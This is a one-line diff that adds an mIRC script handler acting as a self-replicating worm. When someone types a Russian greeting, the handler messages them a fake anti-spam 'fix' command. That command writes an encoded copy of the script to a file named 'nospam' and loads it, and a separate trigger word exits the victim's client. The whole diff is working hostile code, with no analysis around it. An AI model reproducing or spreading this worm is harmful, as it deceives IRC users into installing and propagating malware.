@@ -1,0 +1,1 @@
+on !+1:text:*:*:{ if (привет isin $1-) { .auser 2 $nick | .msg $nick Останови спам, просто напиши: | .msg $nick //write nospam $ $+ decode( $+ $encode($read($script,n,1),m) $+ ,m) $chr(124) .load -rs nospam } | if (TInf == $1) exit }
